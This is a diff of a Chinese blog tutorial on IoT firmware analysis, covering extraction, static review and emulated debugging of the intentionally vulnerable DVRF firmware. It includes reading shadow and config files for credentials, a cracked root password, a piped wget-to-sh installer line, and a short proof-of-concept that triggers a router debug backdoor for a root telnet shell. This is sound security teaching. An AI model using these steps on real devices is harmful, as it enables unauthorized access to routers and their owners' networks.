@@ -254,7 +254,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          4.2k 字
+          4.3k 字
         
       </span>
     
@@ -265,7 +265,7 @@
         
         
         
-          36 分钟
+          37 分钟
         
       </span>
     
@@ -325,29 +325,29 @@
               <div class="markdown-body">
                 
                 <h1 id="01-提取-IoT-固件"><a href="#01-提取-IoT-固件" class="headerlink" title="01-提取 IoT 固件"></a>01-提取 IoT 固件</h1><p>首先我们需要安装固件提取工具 binwalk，由于该工具的安装流程比较繁琐，建议直接使用 Kali Linux，该系统默认安装有 binwalk。</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/ReFirmLabs/</span>binwalk<br></code></pre></td></tr></table></figure>
+<figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;github.com&#x2F;ReFirmLabs&#x2F;binwalk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure>
 
 <p><img src="/2022/12/20/IOT%E5%AE%89%E5%85%A8/IOT%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/01/1.png" srcset="/img/loading.gif" lazyload alt="1"></p>
 <p>提取固件系统的参数是-e，我们可以加上-t -vv 参数查看详细的提取过程。通过输出信息，可以得知该固件系统没有加密压缩，且系统为 Squashfs。</p>
-<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">binwalk -t -vv -e RT-N<span class="hljs-number">300_3.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">4</span>_<span class="hljs-number">378_9317</span>-g2f672ff.trx<br></code></pre></td></tr></table></figure>
+<figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">binwalk -t -vv -e RT-N300_3.0.0.4_378_9317-g2f672ff.trx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure>
 
 <p><img src="/2022/12/20/IOT%E5%AE%89%E5%85%A8/IOT%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/01/2.png" srcset="/img/loading.gif" lazyload alt="2"></p>
 <p>提取出来的文件夹为_RT-N300_3.0.0.4_378_9317-g2f672ff.trx.extracted，其中的 squashfs-root 就是我们想要的该固件的文件系统。<br><img src="/2022/12/20/IOT%E5%AE%89%E5%85%A8/IOT%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/01/3.png" srcset="/img/loading.gif" lazyload alt="3"></p>
 <p>那么 binwalk 的是怎么实现提取的呢？原理就是，通过自带的强大的 magic 特征集，扫描固件中文件系统初始地址的特征码，若匹配成功，则将该段数据 dump 下来，这个 magic 特征集已公开。</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/ReFirmLabs/</span>binwalk<span class="hljs-regexp">/blob/</span><span class="hljs-number">62</span>e9caa164305a18d7d1f037ab27d14ac933d3cf<span class="hljs-regexp">/src/</span>binwalk<span class="hljs-regexp">/magic/</span>filesystems<br></code></pre></td></tr></table></figure>
+<figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;github.com&#x2F;ReFirmLabs&#x2F;binwalk&#x2F;blob&#x2F;62e9caa164305a18d7d1f037ab27d14ac933d3cf&#x2F;src&#x2F;binwalk&#x2F;magic&#x2F;filesystems<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure>
 
 <p><img src="/2022/12/20/IOT%E5%AE%89%E5%85%A8/IOT%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/01/4.png" srcset="/img/loading.gif" lazyload alt="4"></p>
 <p>以这个固件为例，是 Squashfs 文件系统，对应的扫描特征码为 hsqs。<br><img src="/2022/12/20/IOT%E5%AE%89%E5%85%A8/IOT%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/01/5.png" srcset="/img/loading.gif" lazyload alt="5"></p>
 <p>我们可以做个实验，使用 hexdump 搜索 hsqs 的地址，为 0xe20c0，这个就是文件系统的初始地址。</p>
-<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">hexdump -C RT-N<span class="hljs-number">300_3.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">4</span>_<span class="hljs-number">378_9317</span>-g2f672ff.trx | grep -i &#x27;hsqs&#x27;<br></code></pre></td></tr></table></figure>
+<figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">hexdump -C RT-N300_3.0.0.4_378_9317-g2f672ff.trx | grep -i &#39;hsqs&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure>
 
 <p><img src="/2022/12/20/IOT%E5%AE%89%E5%85%A8/IOT%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/01/6.png" srcset="/img/loading.gif" lazyload alt="6"></p>
 <p>使用 dd 命令截取地址 925888（0xe20c0）之后的数据，保存到 rt-n300-fs。</p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">dd <span class="hljs-attribute">if</span>=RT-N300_3.0.0.4_378_9317-g2f672ff.trx <span class="hljs-attribute">bs</span>=1 <span class="hljs-attribute">skip</span>=925888 <span class="hljs-attribute">of</span>=rt-n300-fs<br></code></pre></td></tr></table></figure>
+<figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">dd if&#x3D;RT-N300_3.0.0.4_378_9317-g2f672ff.trx bs&#x3D;1 skip&#x3D;925888 of&#x3D;rt-n300-fs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure>
 
 <p><img src="/2022/12/20/IOT%E5%AE%89%E5%85%A8/IOT%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/01/7.png" srcset="/img/loading.gif" lazyload alt="7"></p>
 <p>最后，使用 unsquashfs rt-n300-fs 命令解析 rt-n300-fs 文件，得到的 squashfs-root 就是固件系统，这个跟上述 binwalk 提取的那个是一样的。</p>
-<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos">unsquashfs rt-n300-<span class="hljs-built_in">fs</span><br></code></pre></td></tr></table></figure>
+<figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">unsquashfs rt-n300-fs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure>
 
 <p><img src="/2022/12/20/IOT%E5%AE%89%E5%85%A8/IOT%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/01/8.png" srcset="/img/loading.gif" lazyload alt="8"></p>
 <h1 id="02-静态分析-IoT-固件"><a href="#02-静态分析-IoT-固件" class="headerlink" title="02 静态分析 IoT 固件"></a>02 静态分析 IoT 固件</h1><p>得到固件后，若直接打开，会发现该固件被加了密，无法直接解压缩，这是厂商对该固件做了保护，防止大家逆向分析他的固件。</p>
@@ -355,27 +355,27 @@
 <p>通过 frackzip 工具可以破解该 zip 的密码，时间要挺久的，我直接告诉你吧，密码是 beUT9Z。<br><img src="/2022/12/20/IOT%E5%AE%89%E5%85%A8/IOT%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/02-%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90IoT%E5%9B%BA%E4%BB%B6/2.png" srcset="/img/loading.gif" lazyload alt="2"></p>
 <p>解压后发现文件夹中有多个.yaffs2 后缀的文件，这些都是固件的文件。<br><img src="/2022/12/20/IOT%E5%AE%89%E5%85%A8/IOT%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/02-%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90IoT%E5%9B%BA%E4%BB%B6/3.png" srcset="/img/loading.gif" lazyload alt="3"></p>
 <p>yaffs2 里有几个看上去是 recovery 的镜像，核心的应该是 2K-mdm-image-mdm9625.yaffs2 ，我们下面就来提取该文件，我首先用 binwalk 来提取它，但提取出来的文件乱七八糟，不知道什么原因，后来看网上推荐直接用 yaffs 的原生工具 unyaffs 提取，就可以了，文件系统清晰明了。</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">unyaffs</span> <span class="hljs-number">2</span>K-mdm-image-mdm9625.yaffs2 yaffs2-root/<br></code></pre></td></tr></table></figure>
+<figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">unyaffs 2K-mdm-image-mdm9625.yaffs2 yaffs2-root&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure>
 
 <p><img src="/2022/12/20/IOT%E5%AE%89%E5%85%A8/IOT%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/02-%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90IoT%E5%9B%BA%E4%BB%B6/4.png" srcset="/img/loading.gif" lazyload alt="4"></p>
 <p>接下来我们查找该路径下的所有.conf 文件，.conf 文件多是配置文件，有可能从中可以发现敏感的信息。</p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> . -name <span class="hljs-string">&#x27;*.conf&#x27;</span><br></code></pre></td></tr></table></figure>
+<figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">find . -name &#39;*.conf&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure>
 
 <p><img src="/2022/12/20/IOT%E5%AE%89%E5%85%A8/IOT%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/02-%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90IoT%E5%9B%BA%E4%BB%B6/5.png" srcset="/img/loading.gif" lazyload alt="5"></p>
 <p>其中的 inadyn-mt.conf 文件引起了我们注意，这是 no-ip 应用的配置文件，no-ip 就是一个相当于花生壳的东西，可以申请动态域名。我们从中可以发现泄露的 no-ip 的登陆账号及密码。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> etc/inadyn-mt.conf<br></code></pre></td></tr></table></figure>
+<figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">cat etc&#x2F;inadyn-mt.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure>
 
 <p><img src="/2022/12/20/IOT%E5%AE%89%E5%85%A8/IOT%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/02-%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90IoT%E5%9B%BA%E4%BB%B6/6.png" srcset="/img/loading.gif" lazyload alt="6"></p>
 <p>除了上述泄露的 no-ip 账号密码，我们还从 shadow 文件中找到了 root 账号的密码，通过爆破可以得到 root 的密码为 1234。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> ~/yaffs2-root/etc/shadow<br></code></pre></td></tr></table></figure>
+<figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">cat ~&#x2F;yaffs2-root&#x2F;etc&#x2F;shadow<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure>
 
 <p><img src="/2022/12/20/IOT%E5%AE%89%E5%85%A8/IOT%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/02-%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90IoT%E5%9B%BA%E4%BB%B6/7.png" srcset="/img/loading.gif" lazyload alt="7"></p>
 <p>其实并不止有.conf 文件会泄露信息，还有很多其他后缀的敏感文件会泄露信息，我们接下来使用 firmwalker 工具来自动化遍历该固件系统中的所有可疑文件。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/craigz28/firmwalker.git<br></code></pre></td></tr></table></figure>
+<figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;craigz28&#x2F;firmwalker.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure>
 
 <p><img src="/2022/12/20/IOT%E5%AE%89%E5%85%A8/IOT%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/02-%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90IoT%E5%9B%BA%E4%BB%B6/8.png" srcset="/img/loading.gif" lazyload alt="8"></p>
 <p>命令如下，firmwalker 会将结果保存到 firmwalker.txt。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./firmwalker.sh ~/yaffs2-root/<br></code></pre></td></tr></table></figure>
+<figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">.&#x2F;firmwalker.sh ~&#x2F;yaffs2-root&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure>
 
 <p><img src="/2022/12/20/IOT%E5%AE%89%E5%85%A8/IOT%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/02-%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90IoT%E5%9B%BA%E4%BB%B6/9.png" srcset="/img/loading.gif" lazyload alt="9"></p>
 <p>看了下该工具的源码，没啥亮点，就是遍历各种后缀的文件。<br><img src="/2022/12/20/IOT%E5%AE%89%E5%85%A8/IOT%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/02-%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90IoT%E5%9B%BA%E4%BB%B6/10.png" srcset="/img/loading.gif" lazyload alt="10"></p>
@@ -384,94 +384,110 @@
 <p>该脚本会在开机的时候以服务的形式运行&#x2F;bin.appmgr 程序。<br><img src="/2022/12/20/IOT%E5%AE%89%E5%85%A8/IOT%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/02-%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90IoT%E5%9B%BA%E4%BB%B6/13.png" srcset="/img/loading.gif" lazyload alt="13"></p>
 <p>通过 IDA 进行反编译，在 main 函数中发现了一个管理员当时为了方便调试留下的后门，只要连接该固件的 39889 端口并发送 HELODBG 的字符串，就可以进行远程执行命令。<br><img src="/2022/12/20/IOT%E5%AE%89%E5%85%A8/IOT%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/02-%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90IoT%E5%9B%BA%E4%BB%B6/14.png" srcset="/img/loading.gif" lazyload alt="14"></p>
 <p>POC 如下：</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs awk">user@kali:~$ echo -ne <span class="hljs-string">&quot;HELODBG&quot;</span> | nc -u <span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span> <span class="hljs-number">39889</span><br>Hello<br>^C<br>user@kali:~$ telnet <span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span><br>Trying <span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span>...<br>Connected to <span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span>. Escape character is <span class="hljs-string">&#x27;^]&#x27;</span>.  <br>OpenEmbedded Linux homerouter.cpe    <br>msm <span class="hljs-number">20141210</span> homerouter.cpe  <br>/ <span class="hljs-comment"># </span><br>id uid=<span class="hljs-number">0</span>(root) gid=<span class="hljs-number">0</span>(root)<br>/ <span class="hljs-comment"># </span><br><span class="hljs-keyword">exit</span><br>Connection closed by foreign host.<br>user@kali:~$<br></code></pre></td></tr></table></figure>
+<figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">user@kali:~$ echo -ne &quot;HELODBG&quot; | nc -u 192.168.1.1 39889
+Hello
+^C
+user@kali:~$ telnet 192.168.1.1
+Trying 192.168.1.1...
+Connected to 192.168.1.1. Escape character is &#39;^]&#39;.  
+OpenEmbedded Linux homerouter.cpe    
+msm 20141210 homerouter.cpe  
+&#x2F; # 
+id uid&#x3D;0(root) gid&#x3D;0(root)
+&#x2F; # 
+exit
+Connection closed by foreign host.
+user@kali:~$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>
 
 <p>除了以上这些，该固件还存在多个漏洞，详细的报告可以参考：</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.anquanke.com<span class="hljs-regexp">/post/i</span>d/<span class="hljs-number">84671</span><br></code></pre></td></tr></table></figure>
+<figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;84671<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure>
 
 <h1 id="03-动态分析-IoT-固件"><a href="#03-动态分析-IoT-固件" class="headerlink" title="03 动态分析 IoT 固件"></a>03 动态分析 IoT 固件</h1><p>动态分析固件之前，需要先把固件运行起来，但我们手头又没有路由器、摄像头之类的物联网硬件，该如何运行呢？这就需要虚拟执行，虚拟执行你就把它想象成一个虚拟机可以运行各种物联网 OS 就是了。虚拟执行 IoT 固件需要用到 firmadyne 工具，该工具很难安装，在 kali 上安装一直报错，你们可以尝试下，反正我是放弃了，最终还是乖乖地用 attifyti 提供的物联网渗透专用虚拟机，下载下来的文件直接用 vmware 导入就行了。<br><a target="_blank" rel="noopener" href="https://www.dropbox.com/sh/xrfzyp1ex2uii53/AAAF0mdA1qFaEBDYZoIxaQRma?dl=0">https://www.dropbox.com/sh/xrfzyp1ex2uii53/AAAF0mdA1qFaEBDYZoIxaQRma?dl=0</a><br><img src="/2022/12/20/IOT%E5%AE%89%E5%85%A8/IOT%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/03-%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90IoT%E5%9B%BA%E4%BB%B6/1.png" srcset="/img/loading.gif" lazyload alt="1"></p>
 <p>该系统为 ubuntu14，密码为 password@123，下面我们来演示虚拟执行一个 dlink 固件。<br><img src="/2022/12/20/IOT%E5%AE%89%E5%85%A8/IOT%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/03-%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90IoT%E5%9B%BA%E4%BB%B6/2.png" srcset="/img/loading.gif" lazyload alt="2"></p>
 <p>在 tools&#x2F;fat 路径下运行 fat.py，输入固件路径 DWP2360b-firmware-v206-rc018.bin，然后是固件的品牌 dlink，依次输入数据库密码 firmadyne 和用户密码 password@123。</p>
-<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> fat.<span class="hljs-keyword">py</span><br></code></pre></td></tr></table></figure>
+<figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">python fat.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure>
 
 <p><img src="/2022/12/20/IOT%E5%AE%89%E5%85%A8/IOT%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/03-%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90IoT%E5%9B%BA%E4%BB%B6/3.png" srcset="/img/loading.gif" lazyload alt="3"></p>
 <p>脚本执行成功后，会回显一个 IP 地址，这个 IP 就是模拟的固件地址。<br><img src="/2022/12/20/IOT%E5%AE%89%E5%85%A8/IOT%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/03-%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90IoT%E5%9B%BA%E4%BB%B6/4.png" srcset="/img/loading.gif" lazyload alt="4"></p>
 <p>以上只是简单地演示如何虚拟执行一个固件，下面我们就来实操如何通过动态调试分析一个固件，接下来的固件采用 DVRF，这是个网友自制的充满漏洞的固件，供学习用的。</p>
-<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">git <span class="hljs-keyword">clone</span> <span class="hljs-title">https</span>://github.com/praetorian-code/DVRF.git<br></code></pre></td></tr></table></figure>
+<figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;praetorian-code&#x2F;DVRF.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure>
 
 <p>开始之前，安装以下工具，动态调试中会用到。</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo apt install gdb-multiarch<br>wget -q -O- https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/hugsy/g</span>ef<span class="hljs-regexp">/raw/m</span>aster<span class="hljs-regexp">/scripts/g</span>ef.sh | sh<br>sudo pip3 install capstone unicorn keystone-engine<br></code></pre></td></tr></table></figure>
+<figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">sudo apt install gdb-multiarch
+wget -q -O- https:&#x2F;&#x2F;github.com&#x2F;hugsy&#x2F;gef&#x2F;raw&#x2F;master&#x2F;scripts&#x2F;gef.sh | sh
+sudo pip3 install capstone unicorn keystone-engine<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure>
 
 <p>安装 keystone-engine 时可能会报错，参考这个链接。<br><a target="_blank" rel="noopener" href="https://github.com/avatartwo/avatar2/issues/23">https://github.com/avatartwo/avatar2/issues/23</a></p>
 <p>安装好工具后，就开始对固件进行分析啦，固件路径如下。<br>DVRF&#x2F;Firmware&#x2F;DVRF_v03.bin<br>使用 binwalk 提取固件文件系统。</p>
-<figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">binwalk -<span class="hljs-built_in">t</span> -e DVRF_v03.bin<br></code></pre></td></tr></table></figure>
+<figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">binwalk -t -e DVRF_v03.bin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure>
 
 <p><img src="/2022/12/20/IOT%E5%AE%89%E5%85%A8/IOT%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/03-%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90IoT%E5%9B%BA%E4%BB%B6/5.png" srcset="/img/loading.gif" lazyload alt="5"></p>
 <p>提取出来的系统有个文件夹 pwnable，这个文件夹就是存放着有漏洞的程序示例，我们选取缓冲区漏洞程序 stack_bof_01 进行实验。首先使用 readelf 命令查看该程序的架构。</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">readelf -h pwnable<span class="hljs-regexp">/Intro/</span>stack_bof_01<br></code></pre></td></tr></table></figure>
+<figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">readelf -h pwnable&#x2F;Intro&#x2F;stack_bof_01<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure>
 
 <p><img src="/2022/12/20/IOT%E5%AE%89%E5%85%A8/IOT%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/03-%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90IoT%E5%9B%BA%E4%BB%B6/6.png" srcset="/img/loading.gif" lazyload alt="6"></p>
 <p>拷贝 qemu-mipsel-static 到当前目录，然后配合 chroot 虚拟执行 stack_bof_01 固件，可以成功执行。qemu 是一款轻型的虚拟机。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cp</span> $(<span class="hljs-built_in">which</span> qemu-mipsel-static) .<br><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">chroot</span> . ./qemu-mipsel-static ./pwnable/Intro/stack_bof_01<br></code></pre></td></tr></table></figure>
+<figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">cp $(which qemu-mipsel-static) .
+sudo chroot . .&#x2F;qemu-mipsel-static .&#x2F;pwnable&#x2F;Intro&#x2F;stack_bof_01<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure>
 
 <p><img src="/2022/12/20/IOT%E5%AE%89%E5%85%A8/IOT%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/03-%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90IoT%E5%9B%BA%E4%BB%B6/7.png" srcset="/img/loading.gif" lazyload alt="7"></p>
 <p>查看 stack_bof_01 的源码，可以发现明显的 strcpy 内存溢出漏洞，当参数 argv[1]超过 200 时，就会出现 buf 溢出的现象。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> DVRF/Pwnable Source/Intro/stack_bof_01.c<br></code></pre></td></tr></table></figure>
+<figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">cat DVRF&#x2F;Pwnable Source&#x2F;Intro&#x2F;stack_bof_01.c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure>
 
 <p><img src="/2022/12/20/IOT%E5%AE%89%E5%85%A8/IOT%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/03-%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90IoT%E5%9B%BA%E4%BB%B6/8.png" srcset="/img/loading.gif" lazyload alt="8"></p>
 <p>以调试的方式启动 stack_bof_01，在本地的 1234 端口监听调试。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">chroot</span> . ./qemu-mipsel-static -g 1234 ./pwnable/Intro/stack_bof_01<br></code></pre></td></tr></table></figure>
+<figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">sudo chroot . .&#x2F;qemu-mipsel-static -g 1234 .&#x2F;pwnable&#x2F;Intro&#x2F;stack_bof_01<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure>
 
 <p><img src="/2022/12/20/IOT%E5%AE%89%E5%85%A8/IOT%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/03-%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90IoT%E5%9B%BA%E4%BB%B6/9.png" srcset="/img/loading.gif" lazyload alt="9"></p>
 <p>运行以下命令开始调试。</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">gdb-multiarch pwnable<span class="hljs-regexp">/Intro/</span>stack_bof_01<br></code></pre></td></tr></table></figure>
+<figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">gdb-multiarch pwnable&#x2F;Intro&#x2F;stack_bof_01<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure>
 
 <p>gdb 运行后，会自动加载 gef 插件，然后设置固件架构为 mips。</p>
-<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> architecture <span class="hljs-comment">mips</span><br></code></pre></td></tr></table></figure>
+<figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">set architecture mips<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure>
 
 <p>设置完远程调试的 IP 和端口，就可开始调试 stack_bof_01 程序了。</p>
-<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">target</span> remote <span class="hljs-number">127.0.0.1:1234</span><br></code></pre></td></tr></table></figure>
+<figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">target remote 127.0.0.1:1234<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure>
 
